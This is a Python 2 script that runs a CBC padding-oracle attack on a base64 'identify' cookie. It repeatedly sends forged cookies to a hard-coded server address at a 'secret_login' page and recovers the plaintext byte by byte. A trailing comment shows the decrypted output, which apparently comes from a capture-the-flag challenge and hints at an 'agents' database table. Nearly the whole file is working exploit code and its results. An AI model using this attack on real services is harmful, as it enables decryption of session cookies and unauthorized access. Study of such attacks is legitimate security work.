from base64 import b64decode as decode
from base64 import b64encode as encode

import requests
import urllib
import re

def xor(a, b):
    res = []
    for i in range(len(a)):
        res.append(chr(ord(a[i])^ord(b[i])))

    return res

# Cookie: identify=U20iNldnibI%3D%7Ci%2FP0b7Csidg7Y7LTtSqz3dqRXMh2bY8VqBU%2F90kj9aih1qT7X%2BmyjwEalzVAHA9woq0ZSaOa%2BH7b2nblXS6mrA%3D%3D
# U20iNldnibI=|i/P0b7Csidg7Y7LTtSqz3dqRXMh2bY8VqBU/90kj9aih1qT7X+myjwEalzVAHA9woq0ZSaOa+H7b2nblXS6mrA==

cookie_p1_b64 = "U20iNldnibI="
cookie_p2_b64 = "i/P0b7Csidg7Y7LTtSqz3dqRXMh2bY8VqBU/90kj9aih1qT7X+myjwEalzVAHA9woq0ZSaOa+H7b2nblXS6mrA=="

cookie_p1 = list(decode(cookie_p1_b64))
cookie_p2 = list(decode(cookie_p2_b64))

def decrypt(block, prev_block):
    imd = []
    result = []
    for b in range(len(imd), 8):
        i = 0
        while i<256:
            try:
                dummy = ['\x00']*(7-b) + [chr(i)] + xor(imd, ([chr(b+1)]*b))
                cookie_p2_tmp = dummy + block

                cookie_p1_raw = encode("".join(cookie_p1))
                cookie_p2_raw = encode("".join(cookie_p2_tmp))
                cookie_identify = cookie_p1_raw + "|" + cookie_p2_raw
                cookies = {"identify": urllib.quote_plus(cookie_identify) }
                r = requests.get("http://110.10.212.147:24135/?p=secret_login", cookies=cookies)

                res = r.content.split("\n")[-1]
                print res

                if "decrypt" not in res:
                    now_imd = chr((b+1)^i)
                    imd.insert(0, now_imd)
                    result.insert(0, chr(ord(now_imd)^ord(prev_block[7-b])))
                    print b, i, "".join(imd).encode("hex"), "".join(result)
                    break

                i+=1
            except:
                pass
        if i==256:
            print "Error something"
            exit()

    return imd, result

payload = cookie_p1 + cookie_p2
f = open("decrypted2", "a")
for rr in range(1, 2):
    print "Start block %d"%(rr)
    imd, result =  decrypt(payload[rr*8:(rr+1)*8],payload[(rr-1)*8:rr*8])
    raw = "".join(imd).encode("hex") + ":" + "".join(result)
    f.write(raw + "\n")
    print raw
    print

f.close()

# Result
'''
1e2871651620cc92:MESSAGE
cda1bb2290ffd981:FROM SPY
07429ffee16bf191:<!--TABL
9fab3daf1303fb66:E:agents
885b6aba0b66a788: NUMBER
ee9084b810a5e7c2:OF COLUM
4f49ad006d31314b:NS:5-->;
f1fd407295acfa7c:SPY;66

MESSAGE FROM SPY<!--TABLE:agents NUMBER OF COLUMNS:5-->;SPY;66
'''
